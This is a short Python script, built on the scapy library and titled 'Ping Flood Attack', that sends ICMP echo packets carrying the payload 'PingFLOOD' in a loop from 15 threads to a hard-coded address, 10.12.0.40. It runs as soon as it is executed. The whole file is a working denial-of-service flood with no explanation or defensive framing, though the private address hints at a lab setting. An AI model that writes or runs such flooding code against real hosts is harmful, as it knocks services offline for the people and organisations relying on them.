import scapy.all as scapy
from scapy.layers.inet import IP, TCP, ICMP, UDP
import threading

"""
Ping Flood Attack
"""

target_ip = "10.12.0.40"

def pingflood():
    ip = IP(dst=target_ip)
    icmp = ICMP()
    raw = scapy.Raw(b"PingFLOOD")
    p = ip / icmp / raw
    ans,unans=scapy.srloop(p,inter=0.3,retry=2,timeout=4)

def threaded_attacks():
    threads = list()
    for index in range(15):
        x = threading.Thread(target=pingflood)
        threads.append(x)
        x.start()

    for index, thread in enumerate(threads):
        thread.join()

threaded_attacks()